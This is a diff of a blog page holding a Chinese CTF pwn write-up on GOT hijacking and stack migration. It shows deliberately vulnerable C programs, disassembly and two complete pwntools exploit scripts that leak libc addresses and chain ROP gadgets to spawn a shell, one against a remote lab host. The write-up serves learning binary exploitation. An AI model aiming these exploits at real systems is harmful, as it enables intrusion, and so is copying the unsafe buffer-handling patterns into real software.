@@ -1,361 +1,602 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Got Hijacking and Stack Migration | AssassinQ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="ctfpwn">
-  
-  
-  
-  
-  <meta name="description" content="记录两道题目，关于Got Hijacking和Stack Migration。">
-<meta name="keywords" content="ctf,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Got Hijacking and Stack Migration">
-<meta property="og:url" content="blog.b3ale.cn/2019/03/16/Got-Hijacking-and-Stack-Migration/index.html">
-<meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="记录两道题目，关于Got Hijacking和Stack Migration。">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-26T05:53:00.448Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Got Hijacking and Stack Migration">
-<meta name="twitter:description" content="记录两道题目，关于Got Hijacking和Stack Migration。">
-  
-    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/favicon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
-    
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>Got Hijacking and Stack Migration - AssassinQ</title>
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-  <script src="/js/jquery-3.1.1.min.js"></script>
 
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css">
-  <link rel="stylesheet" href="/css/fashion.css">
-  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
 
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
-</html>
 
 
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
 
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-  
-  
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
-
-
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
-            
-          </h1>
-          
-          
-            <div class="site-description">ZJGSU-IS-17</div>
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
-                    
-              </ul>
-            </div>
-          </nav>
-
-      </div>
-  </div>
-</header>
-
-
-  <div id="container">
-    <div id="wrap">
-            
-      <div id="content" class="outer">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <section id="main" style="float:none;"><article id="post-Got-Hijacking-and-Stack-Migration" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
         
-  
-    <h1 class="thumb" itemprop="name">
-      Got Hijacking and Stack Migration
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      	<a href="/2019/03/16/Got-Hijacking-and-Stack-Migration/" class="article-date">
-	  <time datetime="2019-03-16T03:49:16.000Z" itemprop="datePublished">March 16, 2019</time>
-	</a>
-
-       
-      
-
-	  |
-	  869 words
-	  |
-	  4 minute(s) to read
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>记录两道题目，关于<code>Got Hijacking</code>和<code>Stack Migration</code>。</p>
-<a id="more"></a>
-<h1 id="Got-Hijacking"><a href="#Got-Hijacking" class="headerlink" title="Got Hijacking"></a>Got Hijacking</h1><p>一般在有格式化字符串漏洞的地方或者 heap 的漏洞利用中经常用到，通过修改某个常规函数的 got 表达到奇怪的目的。</p>
-<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -o main</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    srand(time(<span class="number">0</span>)^getpid());</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> magic = rand();</span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="keyword">if</span>(atoi(buf)==magic)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"OKay..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>想法是直接把 puts 的 got 盖成 system，总共送两次 payload。</p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'sp'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">A = elf.symbols[<span class="string">'A'</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">'gets'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">pop_rdi_ret = g(<span class="string">'pop rdi ; ret'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">offset = <span class="number">136</span></span><br><span class="line">payload = <span class="string">'A'</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - puts_offset</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">payload = <span class="string">'A'</span> * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h1><p>栈迁移（Stack Migration）是在可以输入的 ROP 链长度不够时，可以扩展输入的方法。 核心概念是将 ROP 链分别写在指定区域，然后再把栈迁移过去执行。</p>
-<p>其中为了保持栈帧平衡最重要的一条指令是<code>leave ; ret</code>，32 位下等价于<code>mov esp, ebp ; pop ebp</code>。</p>
-<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vul();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>源码中 buf 为 0x20 个字节，但只让读 0x30 个字节，也就是说我们只能修改 ebp 和 ret 的地址。</p>
-<h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>objdump 反汇编一下 vul 函数：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00000000004006a6 &lt;vul&gt;:</span><br><span class="line">  4006a6:       55                      push   rbp</span><br><span class="line">  4006a7:       48 89 e5                mov    rbp,rsp</span><br><span class="line">  4006aa:       48 83 ec 20             sub    rsp,0x20</span><br><span class="line">  4006ae:       48 8d 45 e0             lea    rax,[rbp-0x20]</span><br><span class="line">  4006b2:       ba 20 00 00 00          mov    edx,0x20</span><br><span class="line">  4006b7:       be 00 00 00 00          mov    esi,0x0</span><br><span class="line">  4006bc:       48 89 c7                mov    rdi,rax</span><br><span class="line">  4006bf:       e8 c4 fe ff ff          call   400588 &lt;_init+0x40&gt; ; memset</span><br><span class="line">  4006c4:       48 8d 45 e0             lea    rax,[rbp-0x20]</span><br><span class="line">  4006c8:       ba 30 00 00 00          mov    edx,0x30</span><br><span class="line">  4006cd:       48 89 c6                mov    rsi,rax</span><br><span class="line">  4006d0:       bf 00 00 00 00          mov    edi,0x0</span><br><span class="line">  4006d5:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">  4006da:       e8 b1 fe ff ff          call   400590 &lt;_init+0x48&gt; ; read</span><br><span class="line">  4006df:       48 8d 45 e0             lea    rax,[rbp-0x20]</span><br><span class="line">  4006e3:       48 89 c7                mov    rdi,rax</span><br><span class="line">  4006e6:       e8 95 fe ff ff          call   400580 &lt;_init+0x38&gt; ; puts</span><br><span class="line">  4006eb:       90                      nop</span><br><span class="line">  4006ec:       c9                      leave</span><br><span class="line">  4006ed:       c3                      ret</span><br></pre></td></tr></table></figure>
-<p>看到 read 其实是往 rbp-0x20 的地方读东西。那么可以想到在第一次 payload 的时候改掉 ebp，然后 ret 到 read 这个地方，于是第二次就可以读一段 rop 到我们设置的 buf 上。然后跳过去。最后一次再跳回到 A，然后往 buf 上写<code>&quot;system(&quot;/bin/sh&quot;)&quot;</code>，再把栈搬过去就能 getshell。</p>
-<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'10.21.13.69'</span>, <span class="number">10015</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>) <span class="comment"># 0x00000000004005ec</span></span><br><span class="line">pop_rdi_ret = g(<span class="string">'pop rdi ; ret'</span>) <span class="comment"># 0x0000000000400673</span></span><br><span class="line">sub_rsp_0x20 = g(<span class="string">'sub rsp, 0x20'</span>) <span class="comment"># 0x4005aa</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>] <span class="comment"># 0x400490</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>] <span class="comment"># 0x600fe8</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>] <span class="comment"># 0x400480</span></span><br><span class="line">buf = <span class="number">0x00602000</span> - <span class="number">0x100</span></span><br><span class="line">vul = elf.symbols[<span class="string">'vul'</span>] <span class="comment"># 0x4005a6</span></span><br><span class="line">gadget1 = <span class="number">0x4006c4</span></span><br><span class="line">read_offset = libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="comment"># p.send(p64(0xdeadbeef).ljust(0x20,'\x00'))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">32</span> + p64(buf) + p64(gadget1)</span><br><span class="line">p.send(payload) <span class="comment"># edit rbp</span></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - <span class="number">0x20</span> - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">read = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = read - read_offset</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">payload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(<span class="number">32</span>, <span class="string">'\x00'</span>) + p64(buf - <span class="number">0x28</span> - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-
-      
-        
-	<div id="comment">
-		<!-- 来必力City版安装代码 -->
-		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
-		<script type="text/javascript">
-		   (function(d, s) {
-		       var j, e = d.getElementsByTagName(s)[0];
-
-		       if (typeof LivereTower === 'function') { return; }
-
-		       j = d.createElement(s);
-		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-		       j.async = true;
-
-		       e.parentNode.insertBefore(j, e);
-		   })(document, 'script');
-		</script>
-		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-		</div>
-		<!-- City版安装代码已完成 -->
-	</div>
-
-
-
-      
-    </footer>
-    <hr class="entry-footer-hr">
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Buffer Overflow with gcc&gt;=4.9
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2019/03/07/Gets一把梭/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Gets一把梭</div>
-    </a>
-  
 </nav>
 
-  
-</article>
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-<!-- Table of Contents -->
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Saturday, March 16th 2019, 11:49 am
+                </p>
+              
 
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
-    
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Got-Hijacking"><span class="nav-number">1.</span> <span class="nav-text">Got Hijacking</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source"><span class="nav-number">1.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stack-Migration"><span class="nav-number">2.</span> <span class="nav-text">Stack Migration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Source-1"><span class="nav-number">2.1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-1"><span class="nav-number">2.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
-    
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    967 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      5 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
     </div>
-  </aside>
+  </header>
 
-</section>
-        
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>记录两道题目，关于<code>Got Hijacking</code>和<code>Stack Migration</code>。</p>
+<a id="more"></a>
+<h1 id="Got-Hijacking"><a href="#Got-Hijacking" class="headerlink" title="Got Hijacking"></a>Got Hijacking</h1><p>一般在有格式化字符串漏洞的地方或者 heap 的漏洞利用中经常用到，通过修改某个常规函数的 got 表达到奇怪的目的。</p>
+<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><pre><code class="cpp">// gcc main.c -o main
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;unistd.h&gt;
+void A(){
+    setvbuf(stdout,0,_IONBF,0);
+    srand(time(0)^getpid());
+    char buf[100];
+    int magic = rand();
+    gets(buf);
+    if(atoi(buf)==magic){
+        puts(&quot;OKay...&quot;);
+    }
+}
+int main(){
+    A();
+}
+</code></pre>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>想法是直接把 puts 的 got 盖成 system，总共送两次 payload。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="python">#!/usr/bin/env python
+from pwn import *
+# context.log_level=&#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]
+context.arch = &#39;amd64&#39;
+p = process(&#39;./main&#39;)
+elf = ELF(&#39;./main&#39;)
+libc = ELF(&#39;./libc.so&#39;)
+g = lambda x: next(elf.search(asm(x)))
+A = elf.symbols[&#39;A&#39;]
+gets_plt = elf.plt[&#39;gets&#39;]
+puts_plt = elf.plt[&#39;puts&#39;]
+puts_got = elf.got[&#39;puts&#39;]
+puts_offset = libc.symbols[&#39;puts&#39;]
+system_offset = libc.symbols[&#39;system&#39;]
+str_bin_sh_offset = next(libc.search(&#39;/bin/sh&#39;))
+pop_rdi_ret = g(&#39;pop rdi ; ret&#39;)
+# gdb.attach(p)
+offset = 136
+payload = &#39;A&#39; * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)
+p.sendline(payload)
+libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - puts_offset
+success(&#39;libc_base = &#39; + hex(libc_base))
+system = libc_base + system_offset
+str_bin_sh = libc_base + str_bin_sh_offset
